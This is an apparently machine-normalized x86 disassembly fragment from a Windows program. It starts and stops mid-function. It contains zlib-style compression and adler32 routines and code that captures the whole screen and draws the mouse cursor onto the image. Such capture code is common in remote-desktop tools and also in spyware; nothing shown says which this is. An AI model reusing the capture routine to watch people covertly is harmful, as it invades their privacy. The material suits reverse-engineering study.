and cl 0xff
mov [ edx ] cl
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov edx [ eax + 0x8 ]
lea ecx [ edx + ecx ]
push ecx
movzx edx [ eax + 0x16b0 ]
pop ecx
sar edx 0x8
mov [ ecx ] dl
mov ecx 0x10
movzx edx si
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov [ eax + 0x16b0 ] dx
add ebx [ eax + 0x16b4 ]
mov [ eax + 0x16b4 ] ebx
jmp r-xdata
push 0x1
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3aeb538
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_3aea978
push ebx
push esi
push edi
mov ebx eax
mov eax 0x3
mov edx 0x10
sub edx eax
mov esi [ ebx + 0x16b4 ]
cmp edx esi
jge r-xdata
mov dx 0x2
mov ecx [ ebx + 0x16b4 ]
shl dx cl
or [ ebx + 0x16b0 ] dx
add [ ebx + 0x16b4 ] eax
mov edx 0x2
mov ecx esi
mov edi edx
sub eax 0x10
mov esi edi
shl si cl
or [ ebx + 0x16b0 ] si
movzx edx di
mov ecx [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov esi [ ebx + 0x8 ]
lea ecx [ esi + ecx ]
push ecx
pop esi
mov cl [ ebx + 0x16b0 ]
and cl 0xff
mov [ esi ] cl
mov ecx [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov esi [ ebx + 0x8 ]
lea ecx [ esi + ecx ]
push ecx
movzx ecx [ ebx + 0x16b0 ]
pop esi
sar ecx 0x8
mov [ esi ] cl
mov ecx 0x10
sub ecx [ ebx + 0x16b4 ]
sar edx cl
mov [ ebx + 0x16b0 ] dx
add eax [ ebx + 0x16b4 ]
mov [ ebx + 0x16b4 ] eax
jmp r-xdata
mov ecx [ ebx + 0x16b4 ]
mov edx rw-data
mov dx [ edx ]
shl dx cl
or [ ebx + 0x16b0 ] dx
add [ ebx + 0x16b4 ] eax
mov edx rw-data
mov ecx esi
sub eax 0x10
movzx edx [ edx ]
mov edi edx
movzx edx di
mov esi edi
shl si cl
or [ ebx + 0x16b0 ] si
mov ecx [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov esi [ ebx + 0x8 ]
lea ecx [ esi + ecx ]
push ecx
pop esi
mov cl [ ebx + 0x16b0 ]
and cl 0xff
mov [ esi ] cl
mov ecx [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov esi [ ebx + 0x8 ]
lea ecx [ esi + ecx ]
push ecx
movzx ecx [ ebx + 0x16b0 ]
pop esi
sar ecx 0x8
mov [ esi ] cl
mov ecx 0x10
sub ecx [ ebx + 0x16b4 ]
sar edx cl
mov [ ebx + 0x16b0 ] dx
add eax [ ebx + 0x16b4 ]
mov [ ebx + 0x16b4 ] eax
jmp r-xdata
mov eax rw-data
mov edx 0x10
mov esi [ ebx + 0x16b4 ]
movzx eax [ eax ]
sub edx eax
cmp edx esi
jge r-xdata
mov [ ebx + 0x16ac ] 0x7
pop edi
pop esi
pop ebx
retn
mov eax 0x3
mov ecx 0x10
sub ecx eax
cmp edx ecx
jle r-xdata
mov eax ebx
call sub_3aeb45c
mov ecx [ ebx + 0x16ac ]
add ecx 0xb
mov edx [ ebx + 0x16b4 ]
sub ecx edx
cmp ecx 0x9
jge r-xdata
mov dx 0x2
mov ecx [ ebx + 0x16b4 ]
shl dx cl
or [ ebx + 0x16b0 ] dx
add [ ebx + 0x16b4 ] eax
mov esi 0x2
mov ecx edx
mov edi esi
sub eax 0x10
mov edx edi
shl dx cl
or [ ebx + 0x16b0 ] dx
mov ecx [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov edx [ ebx + 0x8 ]
lea ecx [ edx + ecx ]
push ecx
pop ecx
mov dl [ ebx + 0x16b0 ]
and dl 0xff
mov [ ecx ] dl
mov edx [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov ecx [ ebx + 0x8 ]
lea edx [ ecx + edx ]
push edx
movzx ecx [ ebx + 0x16b0 ]
pop edx
sar ecx 0x8
mov [ edx ] cl
mov ecx 0x10
movzx edx di
sub ecx [ ebx + 0x16b4 ]
sar edx cl
mov [ ebx + 0x16b0 ] dx
add eax [ ebx + 0x16b4 ]
mov [ ebx + 0x16b4 ] eax
jmp r-xdata
mov ecx [ ebx + 0x16b4 ]
mov edx rw-data
mov dx [ edx ]
shl dx cl
or [ ebx + 0x16b0 ] dx
add [ ebx + 0x16b4 ] eax
mov edx rw-data
mov ecx esi
sub eax 0x10
movzx edx [ edx ]
mov edi edx
movzx edx di
mov esi edi
shl si cl
or [ ebx + 0x16b0 ] si
mov ecx [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov esi [ ebx + 0x8 ]
lea ecx [ esi + ecx ]
push ecx
pop esi
mov cl [ ebx + 0x16b0 ]
and cl 0xff
mov [ esi ] cl
mov ecx [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov esi [ ebx + 0x8 ]
lea ecx [ esi + ecx ]
push ecx
movzx ecx [ ebx + 0x16b0 ]
pop esi
sar ecx 0x8
mov [ esi ] cl
mov ecx 0x10
sub ecx [ ebx + 0x16b4 ]
sar edx cl
mov [ ebx + 0x16b0 ] dx
add eax [ ebx + 0x16b4 ]
mov [ ebx + 0x16b4 ] eax
jmp r-xdata
mov eax rw-data
mov edx 0x10
mov esi [ ebx + 0x16b4 ]
movzx eax [ eax ]
sub edx eax
cmp edx esi
jge r-xdata
mov eax ebx
call sub_3aeb45c
sub_3aeac44
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x4 ] edx
xor eax eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
cmp [ ebx + 0x7c ] 0x0
mov edi ecx
jle r-xdata
lea edx [ edi + 0x5 ]
mov eax edx
cmp [ ebx + 0x1c ] 0x2
jne r-xdata
cmp eax edx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea edx [ ebx + 0xb10 ]
mov eax ebx
call sub_3ae9bc4
lea edx [ ebx + 0xb1c ]
mov eax ebx
call sub_3ae9bc4
mov eax ebx
call sub_3aea560
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x16a0 ]
mov edx [ ebx + 0x16a4 ]
add edx 0xa
add eax 0xa
shr eax 0x3
shr edx 0x3
cmp eax edx
jb r-xdata
mov eax ebx
call sub_3aeb3cc
mov eax 0x3
mov edx 0x10
sub edx eax
cmp edx [ ebx + 0x16b4 ]
jge r-xdata
mov eax 0x3
mov edx 0x10
sub edx eax
cmp edx [ ebx + 0x16b4 ]
jge r-xdata
push esi
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_3aea8bc
jmp r-xdata
lea ecx [ edi + 0x4 ]
cmp eax ecx
jb r-xdata
mov eax edx
jmp r-xdata
mov ecx [ ebx + 0x16b4 ]
mov edx esi
add dx 0x4
shl dx cl
or [ ebx + 0x16b0 ] dx
add [ ebx + 0x16b4 ] eax
lea edx [ esi + 0x4 ]
mov ecx [ ebx + 0x16b4 ]
mov edi edx
sub eax 0x10
shl di cl
or [ ebx + 0x16b0 ] di
movzx edx dx
mov ecx [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov edi [ ebx + 0x8 ]
lea ecx [ edi + ecx ]
push ecx
pop edi
mov cl [ ebx + 0x16b0 ]
and cl 0xff
mov [ edi ] cl
mov ecx [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov edi [ ebx + 0x8 ]
lea ecx [ edi + ecx ]
push ecx
movzx ecx [ ebx + 0x16b0 ]
pop edi
sar ecx 0x8
mov [ edi ] cl
mov ecx 0x10
sub ecx [ ebx + 0x16b4 ]
sar edx cl
mov [ ebx + 0x16b0 ] dx
add eax [ ebx + 0x16b4 ]
mov [ ebx + 0x16b4 ] eax
jmp r-xdata
mov ecx [ ebx + 0x16b4 ]
mov edx esi
add dx 0x2
shl dx cl
or [ ebx + 0x16b0 ] dx
add [ ebx + 0x16b4 ] eax
lea edx [ esi + 0x2 ]
mov ecx [ ebx + 0x16b4 ]
mov edi edx
sub eax 0x10
shl di cl
or [ ebx + 0x16b0 ] di
movzx edx dx
mov ecx [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov edi [ ebx + 0x8 ]
lea ecx [ edi + ecx ]
push ecx
pop edi
mov cl [ ebx + 0x16b0 ]
and cl 0xff
mov [ edi ] cl
mov ecx [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov edi [ ebx + 0x8 ]
lea ecx [ edi + ecx ]
push ecx
movzx ecx [ ebx + 0x16b0 ]
pop edi
sar ecx 0x8
mov [ edi ] cl
mov ecx 0x10
sub ecx [ ebx + 0x16b4 ]
sar edx cl
mov [ ebx + 0x16b0 ] dx
add eax [ ebx + 0x16b4 ]
mov [ ebx + 0x16b4 ] eax
jmp r-xdata
mov eax ebx
call sub_3ae97f4
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax ebx
call sub_3aeb4d0
mov eax [ ebp - 0x8 ]
inc eax
push eax
mov eax ebx
mov ecx [ ebx + 0xb20 ]
mov edx [ ebx + 0xb14 ]
inc ecx
inc edx
call sub_3aea5c4
lea ecx [ ebx + 0x980 ]
lea edx [ ebx + 0x8c ]
mov eax ebx
call sub_3aeaf0c
mov ecx rw-data
mov edx rw-data
mov eax ebx
call sub_3aeaf0c
jmp r-xdata
sub_3aeae80
push ebx
push esi
mov esi [ eax + 0x1698 ]
mov ebx [ eax + 0x169c ]
mov [ ebx + esi * 2 ] dx
mov ebx [ eax + 0x1698 ]
inc [ eax + 0x1698 ]
mov esi [ eax + 0x1690 ]
test edx edx
lea ebx [ esi + ebx ]
push ebx
pop ebx
mov [ ebx ] cl
jne r-xdata
inc [ eax + 0x16a8 ]
dec edx
movzx ecx [ ecx + rw-data ]
inc [ eax + ecx * 4 + 0x490 ]
cmp edx 0x100
jae r-xdata
inc [ eax + ecx * 4 + 0x8c ]
jmp r-xdata
shr edx 0x7
mov cl [ edx + rw-data ]
mov cl [ edx + rw-data ]
jmp r-xdata
mov edx [ eax + 0x1694 ]
dec edx
cmp edx [ eax + 0x1698 ]
sete al
and eax 0x1
pop esi
pop ebx
retn
xor edx edx
mov dl cl
inc [ eax + edx * 4 + 0x980 ]
sub_3aeaf0c
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
xor ecx ecx
mov [ esp + 0x4 ] ecx
cmp [ eax + 0x1698 ] 0x0
je r-xdata
movzx ebx [ edx + 0x402 ]
mov ecx 0x10
sub ecx ebx
mov edi [ eax + 0x16b4 ]
cmp ecx edi
jge r-xdata
mov ecx [ eax + 0x169c ]
mov ebx [ esp + 0x4 ]
movzx esi [ ecx + ebx * 2 ]
mov ecx [ eax + 0x1690 ]
mov ebx [ esp + 0x4 ]
movzx edi [ ecx + ebx ]
inc [ esp + 0x4 ]
test esi esi
jne r-xdata
mov si [ edx + 0x400 ]
mov ecx [ eax + 0x16b4 ]
shl si cl
or [ eax + 0x16b0 ] si
add [ eax + 0x16b4 ] ebx
movzx esi [ edx + 0x400 ]
mov ecx edi
mov edi esi
shl di cl
or [ eax + 0x16b0 ] di
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov edi [ eax + 0x8 ]
lea ecx [ edi + ecx ]
push ecx
mov cl [ eax + 0x16b0 ]
and cl 0xff
pop edi
mov [ edi ] cl
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov edi [ eax + 0x8 ]
lea ecx [ edi + ecx ]
push ecx
movzx ecx [ eax + 0x16b0 ]
sar ecx 0x8
pop edi
mov [ edi ] cl
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
movzx esi si
sar esi cl
mov [ eax + 0x16b0 ] si
sub ebx 0x10
add ebx [ eax + 0x16b4 ]
mov [ eax + 0x16b4 ] ebx
jmp r-xdata
xor ebx ebx
mov bl [ edi + rw-data ]
movzx ecx [ edx + ebx * 4 + 0x406 ]
mov [ esp + 0x8 ] ecx
mov ecx 0x10
sub ecx [ esp + 0x8 ]
cmp ecx [ eax + 0x16b4 ]
jge r-xdata
movzx ebx [ edx + edi * 4 + 0x2 ]
mov ecx 0x10
sub ecx ebx
cmp ecx [ eax + 0x16b4 ]
jge r-xdata
movzx edx [ edx + 0x402 ]
mov [ eax + 0x16ac ] edx
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov bp [ edx + ebx * 4 + 0x404 ]
mov ecx [ eax + 0x16b4 ]
shl bp cl
or [ eax + 0x16b0 ] bp
mov ecx [ esp + 0x8 ]
add [ eax + 0x16b4 ] ecx
movzx ecx [ edx + ebx * 4 + 0x404 ]
mov [ esp + 0xc ] ecx
mov bp [ esp + 0xc ]
mov ecx [ eax + 0x16b4 ]
shl bp cl
or [ eax + 0x16b0 ] bp
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
pop ebp
mov cl [ eax + 0x16b0 ]
and cl 0xff
mov [ ebp ] cl
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
movzx ecx [ eax + 0x16b0 ]
pop ebp
sar ecx 0x8
mov [ ebp ] cl
mov ecx 0x10
movzx ebp [ esp + 0xc ]
sub ecx [ eax + 0x16b4 ]
sar ebp cl
mov [ eax + 0x16b0 ] bp
mov ecx [ esp + 0x8 ]
sub ecx 0x10
add ecx [ eax + 0x16b4 ]
mov [ eax + 0x16b4 ] ecx
jmp r-xdata
mov si [ edx + edi * 4 ]
mov ecx [ eax + 0x16b4 ]
shl si cl
or [ eax + 0x16b0 ] si
add [ eax + 0x16b4 ] ebx
jmp r-xdata
movzx esi [ edx + edi * 4 ]
mov edi esi
mov ecx [ eax + 0x16b4 ]
mov ebp edi
sub ebx 0x10
shl bp cl
or [ eax + 0x16b0 ] bp
movzx esi di
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
pop ebp
mov cl [ eax + 0x16b0 ]
and cl 0xff
mov [ ebp ] cl
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
movzx ecx [ eax + 0x16b0 ]
pop ebp
sar ecx 0x8
mov [ ebp ] cl
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar esi cl
mov [ eax + 0x16b0 ] si
add ebx [ eax + 0x16b4 ]
mov [ eax + 0x16b4 ] ebx
jmp r-xdata
dec esi
cmp esi 0x100
jae r-xdata
sub edi [ ebx * 4 + rw-data ]
mov ebx ecx
mov ecx 0x10
sub ecx ebx
cmp ecx [ eax + 0x16b4 ]
jge r-xdata
mov ecx [ ebx * 4 + rw-data ]
test ecx ecx
je r-xdata
mov ecx [ esp + 0x4 ]
cmp ecx [ eax + 0x1698 ]
jb r-xdata
mov ecx esi
shr ecx 0x7
mov bl [ ecx + rw-data ]
mov bl [ esi + rw-data ]
jmp r-xdata
mov ecx [ eax + 0x16b4 ]
shl di cl
or [ eax + 0x16b0 ] di
add [ eax + 0x16b4 ] ebx
mov ecx [ eax + 0x16b4 ]
mov ebp edi
shl bp cl
or [ eax + 0x16b0 ] bp
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
mov cl [ eax + 0x16b0 ]
and cl 0xff
pop ebp
mov [ ebp ] cl
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
movzx ecx [ eax + 0x16b0 ]
sar ecx 0x8
pop ebp
mov [ ebp ] cl
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
movzx edi di
sar edi cl
mov [ eax + 0x16b0 ] di
sub ebx 0x10
add ebx [ eax + 0x16b4 ]
mov [ eax + 0x16b4 ] ebx
jmp r-xdata
mov ecx [ eax + 0x16b4 ]
mov ebp [ esp ]
mov bp [ ebp + ebx * 4 ]
shl bp cl
or [ eax + 0x16b0 ] bp
add [ eax + 0x16b4 ] edi
mov ecx [ esp ]
sub edi 0x10
movzx ecx [ ecx + ebx * 4 ]
mov [ esp + 0x10 ] ecx
mov bp [ esp + 0x10 ]
mov ecx [ eax + 0x16b4 ]
shl bp cl
or [ eax + 0x16b0 ] bp
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
pop ebp
mov cl [ eax + 0x16b0 ]
and cl 0xff
mov [ ebp ] cl
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
movzx ecx [ eax + 0x16b0 ]
pop ebp
sar ecx 0x8
mov [ ebp ] cl
mov ecx 0x10
movzx ebp [ esp + 0x10 ]
sub ecx [ eax + 0x16b4 ]
sar ebp cl
mov [ eax + 0x16b0 ] bp
add edi [ eax + 0x16b4 ]
mov [ eax + 0x16b4 ] edi
jmp r-xdata
and ebx 0xff
mov ecx [ esp ]
movzx edi [ ecx + ebx * 4 + 0x2 ]
mov ecx 0x10
sub ecx edi
cmp ecx [ eax + 0x16b4 ]
jge r-xdata
sub esi [ ebx * 4 + rw-data ]
mov ebx ecx
mov ecx 0x10
sub ecx ebx
mov edi [ eax + 0x16b4 ]
cmp ecx edi
jge r-xdata
mov ecx [ ebx * 4 + rw-data ]
test ecx ecx
je r-xdata
mov ecx [ eax + 0x16b4 ]
shl si cl
or [ eax + 0x16b0 ] si
add [ eax + 0x16b4 ] ebx
mov ecx edi
mov edi esi
shl di cl
or [ eax + 0x16b0 ] di
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov edi [ eax + 0x8 ]
lea ecx [ edi + ecx ]
push ecx
mov cl [ eax + 0x16b0 ]
and cl 0xff
pop edi
mov [ edi ] cl
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov edi [ eax + 0x8 ]
lea ecx [ edi + ecx ]
push ecx
movzx ecx [ eax + 0x16b0 ]
sar ecx 0x8
pop edi
mov [ edi ] cl
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
movzx esi si
sar esi cl
mov [ eax + 0x16b0 ] si
sub ebx 0x10
add ebx [ eax + 0x16b4 ]
mov [ eax + 0x16b4 ] ebx
jmp r-xdata
sub_3aeb3cc
push ebx
push esi
push edi
xor edx edx
xor esi esi
xor ecx ecx
lea ebx [ eax + 0x8c ]
movzx edi [ ebx ]
add ecx edi
inc edx
add ebx 0x4
cmp edx 0x7
jl r-xdata
lea ebx [ eax + edx * 4 + 0x8c ]
cmp edx 0x80
jge r-xdata
lea ebx [ eax + edx * 4 + 0x8c ]
cmp edx 0x100
jge r-xdata
movzx edi [ ebx ]
add esi edi
inc edx
add ebx 0x4
cmp edx 0x80
jl r-xdata
shr esi 0x2
cmp ecx esi
jbe r-xdata
movzx edi [ ebx ]
add ecx edi
inc edx
add ebx 0x4
cmp edx 0x100
jl r-xdata
mov dl 0x1
xor edx edx
jmp r-xdata
mov [ eax + 0x1c ] dl
pop edi
pop esi
pop ebx
retn
sub_3aeb440
push ebx
xor ecx ecx
mov ebx eax
dec edx
and ebx 0x1
or ecx ebx
shr eax 0x1
add ecx ecx
test edx edx
jg r-xdata
mov eax ecx
shr eax 0x1
pop ebx
retn
sub_3aeb45c
push ebx
cmp [ eax + 0x16b4 ] 0x10
jne r-xdata
cmp [ eax + 0x16b4 ] 0x8
jl r-xdata
mov edx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ecx [ eax + 0x8 ]
mov bl [ eax + 0x16b0 ]
and bl 0xff
mov [ ecx + edx ] bl
mov edx [ eax + 0x14 ]
inc [ eax + 0x14 ]
movzx ebx [ eax + 0x16b0 ]
mov ecx [ eax + 0x8 ]
sar ebx 0x8
mov [ ecx + edx ] bl
xor edx edx
mov [ eax + 0x16b0 ] 0x0
mov [ eax + 0x16b4 ] edx
pop ebx
retn
pop ebx
retn
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov edx [ eax + 0x8 ]
mov bl [ eax + 0x16b0 ]
mov [ edx + ecx ] bl
shr [ eax + 0x16b0 ] 0x8
sub [ eax + 0x16b4 ] 0x8
sub_3aeb4d0
push ebx
cmp [ eax + 0x16b4 ] 0x8
jle r-xdata
cmp [ eax + 0x16b4 ] 0x0
jle r-xdata
mov edx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ecx [ eax + 0x8 ]
mov bl [ eax + 0x16b0 ]
and bl 0xff
mov [ ecx + edx ] bl
mov edx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ecx [ eax + 0x8 ]
movzx ebx [ eax + 0x16b0 ]
sar ebx 0x8
mov [ ecx + edx ] bl
jmp r-xdata
mov [ eax + 0x16b0 ] 0x0
xor edx edx
mov [ eax + 0x16b4 ] edx
pop ebx
retn
mov edx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ecx [ eax + 0x8 ]
mov bl [ eax + 0x16b0 ]
mov [ ecx + edx ] bl
sub_3aeb538
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_3aeb4d0
mov [ ebx + 0x16ac ] 0x8
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax edi
add edi 0xffffffff
test eax eax
jne r-xdata
mov edx [ ebx + 0x14 ]
mov eax edi
inc [ ebx + 0x14 ]
mov ecx [ ebx + 0x8 ]
lea edx [ ecx + edx ]
mov ecx eax
push edx
and cl 0xff
pop edx
not al
mov [ edx ] cl
and al 0xff
mov ecx [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov edx [ ebx + 0x8 ]
lea ecx [ edx + ecx ]
movzx edx di
push ecx
pop ecx
sar edx 0x8
mov [ ecx ] dl
mov edx [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov ecx [ ebx + 0x8 ]
lea edx [ ecx + edx ]
push edx
pop ecx
mov [ ecx ] al
mov ecx edi
not cx
movzx ecx cx
mov eax [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov edx [ ebx + 0x8 ]
sar ecx 0x8
mov [ edx + eax ] cl
jmp r-xdata
mov eax [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov edx [ ebx + 0x8 ]
mov cl [ esi ]
mov [ edx + eax ] cl
inc esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_3aeb5d4
push ebx
push esi
push edi
mov edi eax
shr edi 0x10
mov ebx eax
and ebx 0xffff
and edi 0xffff
push ebp
mov esi edx
test esi esi
mov ebp ecx
jne r-xdata
test ebp ebp
jbe r-xdata
mov eax 0x1
jmp r-xdata
mov eax edi
shl eax 0x10
or eax ebx
cmp ebp 0x15b0
jae r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax 0x15b0
mov eax ebp
jmp r-xdata
test eax eax
je r-xdata
xor edx edx
xor ecx ecx
mov dl [ esi ]
mov cl [ esi + 0x1 ]
add ebx edx
xor edx edx
add edi ebx
add ebx ecx
mov dl [ esi + 0x2 ]
add edi ebx
add ebx edx
xor ecx ecx
mov cl [ esi + 0x3 ]
add edi ebx
add ebx ecx
xor edx edx
mov dl [ esi + 0x4 ]
add edi ebx
add ebx edx
xor ecx ecx
mov cl [ esi + 0x5 ]
add edi ebx
add ebx ecx
xor edx edx
mov dl [ esi + 0x6 ]
add edi ebx
add ebx edx
xor ecx ecx
mov cl [ esi + 0x7 ]
add edi ebx
add ebx ecx
xor edx edx
mov dl [ esi + 0x8 ]
add edi ebx
add ebx edx
xor ecx ecx
mov cl [ esi + 0x9 ]
add edi ebx
add ebx ecx
xor edx edx
mov dl [ esi + 0xa ]
add edi ebx
add ebx edx
xor ecx ecx
mov cl [ esi + 0xb ]
add edi ebx
add ebx ecx
xor edx edx
mov dl [ esi + 0xc ]
add edi ebx
add ebx edx
xor ecx ecx
mov cl [ esi + 0xd ]
add edi ebx
add ebx ecx
xor edx edx
mov dl [ esi + 0xe ]
add edi ebx
add ebx edx
xor ecx ecx
mov cl [ esi + 0xf ]
add edi ebx
add ebx ecx
add esi 0x10
add edi ebx
sub eax 0x10
cmp eax 0x10
jge r-xdata
sub ebp eax
cmp eax 0x10
jl r-xdata
mov ecx 0xfff1
mov eax ebx
xor edx edx
div ecx
mov ebx edx
mov ecx 0xfff1
mov eax edi
xor edx edx
div ecx
mov edi edx
test ebp ebp
ja r-xdata
xor edx edx
mov dl [ esi ]
add ebx edx
inc esi
add edi ebx
dec eax
jne r-xdata
sub_3aeb700
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x1 ] al
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a8e204
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a89cb0
mov [ ebp - 0x14 ] eax
push 0x0
call GetWindowDC
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_3aeb7b4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
call sub_3a8a3c8
push 0x1
call GetSystemMetrics
push eax
lea eax [ ebp - 0x34 ]
push eax
push 0x0
call GetSystemMetrics
mov ecx eax
xor edx edx
xor eax eax
call sub_3a78e1c
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0xc ]
call sub_3a8e7d8
lea edx [ ebp - 0x34 ]
mov ecx [ ebp - 0x14 ]
call sub_3a89dd0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aeb7bb
mov eax [ ebp - 0x10 ]
push eax
push 0x0
call ReleaseDC
retn
sub_3aeb7bb
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_3a8a3c8
mov eax [ ebp - 0x14 ]
call sub_3a64380
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov dl 0x3
mov eax [ ebp - 0xc ]
call sub_3a8f6f0
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov eax [ ebp - 0xc ]
call sub_3a64380
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x1c ]
push eax
call GetCursorPos
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a8fc88
mov ebx eax
lea eax [ ebp - 0x24 ]
push eax
call GetCursorPos
push [ ebp - 0x20 ]
push [ ebp - 0x24 ]
call WindowFromPoint
push 0x0
push eax
call __imp_GetWindowThreadProcessId
mov esi eax
push 0xffffffff
push esi
call GetCurrentThreadId
push eax
call AttachThreadInput
call GetCursor
mov edx eax
mov eax ebx
call sub_3a90098
push 0x0
push esi
call GetCurrentThreadId
push eax
call AttachThreadInput
lea eax [ ebp - 0x48 ]
push eax
mov eax ebx
call sub_3a8fdc8
push eax
call GetIconInfo
mov eax [ ebp - 0x44 ]
mov [ ebp - 0x50 ] eax
xor eax eax
mov [ ebp - 0x4c ] eax
fild [ ebp - 0x50 ]
call sub_3a63418
mov esi [ ebp - 0x1c ]
sub esi eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x50 ] eax
xor eax eax
mov [ ebp - 0x4c ] eax
fild [ ebp - 0x50 ]
call sub_3a63418
mov edi [ ebp - 0x18 ]
sub edi eax
push ebx
mov eax [ ebp - 0xc ]
call sub_3a8e7d8
mov ecx edi
mov edx esi
call sub_3a89e58
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
mov eax [ ebp - 0x3c ]
push eax
call DeleteObject
mov eax ebx
call sub_3a9005c
mov eax ebx
call sub_3a64380
sub_3aeb8d0
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
mov [ esp + 0x4 ] edx
mov [ esp ] eax
mov eax [ esp + 0x4 ]
call sub_3a7d3a0
mov eax esi
call sub_3a7d3a0
mov edx [ esp + 0x4 ]
mov al 0x1
call sub_3aeb700
mov eax [ esp ]
mov edi [ eax + 0x4 ]
mov eax [ esp + 0x4 ]
mov ebx [ eax + 0x4 ]
mov eax [ esp ]
mov edx [ eax ]
call [ edx ]
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov esi [ esi + 0x4 ]
mov eax [ esp ]
mov edx [ eax ]
call [ edx ]
dec eax
test eax eax
jl r-xdata
mov eax [ esp ]
call sub_3a7d3a0
push 0x0
push 0x0
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
call sub_3a7ce38
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
inc eax
mov [ esi ] dl
mov [ esi ] 0x30
jmp r-xdata
movzx ecx [ edi ]
movzx edx [ ebx ]
cmp cl dl
jne r-xdata
inc edi
inc ebx
inc esi
dec eax
jne r-xdata
sub_3aeb960
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx ecx
mov [ esp + 0x4 ] edx
mov [ esp ] eax
mov eax [ esp ]
mov edi [ eax + 0x4 ]
mov eax [ esp ]
mov edx [ eax ]
call [ edx ]
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax ]
